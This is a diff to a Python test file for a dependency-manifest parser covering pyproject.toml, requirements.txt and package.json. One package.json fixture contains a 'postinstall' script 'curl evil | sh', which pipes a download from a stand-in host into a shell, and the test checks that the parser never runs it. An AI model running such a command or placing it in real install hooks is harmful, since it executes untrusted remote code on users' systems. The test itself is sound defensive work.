@@ -107,22 +107,27 @@ def test_surface_reading_of_c_js_shell(b1reg):
     assert any("surface reading" in n for n in out.notes)
 
 
+def manifest(data, fmt):
+    """Lane K's detect does not yet return the manifest names (asked for): the adapter is called as decode would."""
+    return codemod.read_manifest(data, T.Detected("code", fmt, "text/plain", "declared", None, ()), T.Limits())
+
+
 def test_manifests(b1reg):
     py = (b'[project]\nname = "demo"\nversion = "1.0"\ndependencies = ["numpy>=2", "Zstandard==0.25; python_version>\'3\'"]\n'
           b'[project.optional-dependencies]\nweb = ["pypdf==7.1.1"]\n[build-system]\nrequires = ["setuptools>=69"]\n')
-    g = b1reg.decode(py, name="pyproject.toml").representation
+    g = manifest(py, "pyproject").representation
     kinds = {(e.dst, e.kind) for e in g.edges}
     assert {("package:numpy", "depends"), ("package:zstandard", "depends"), ("package:pypdf", "optional"),
             ("package:setuptools", "build")} <= kinds
     z = next(n for n in g.nodes if n.id == "package:zstandard")
     assert z.attrs["spec"] == "==0.25" and z.attrs["marker"] == "python_version>'3'"
     req = b"# pinned\nrequests==2.32\n-r other.txt\n--index-url https://x\nflask[async]>=3 ; os_name=='posix'\n"
-    out = b1reg.decode(req, name="requirements.txt")
+    out = manifest(req, "requirements")
     assert {n.id for n in out.representation.nodes} >= {"package:requests", "package:flask"}
     assert any("not followed" in n for n in out.notes)
     pj = json.dumps({"name": "app", "dependencies": {"react": "^18"}, "devDependencies": {"vite": "5"},
                      "scripts": {"postinstall": "curl evil | sh"}}).encode()
-    out = b1reg.decode(pj, name="package.json")
+    out = manifest(pj, "package-json")
     assert {(e.dst, e.kind) for e in out.representation.edges} == {("package:react", "depends"),
                                                                   ("package:vite", "dev")}
     assert any("never run" in n for n in out.notes)
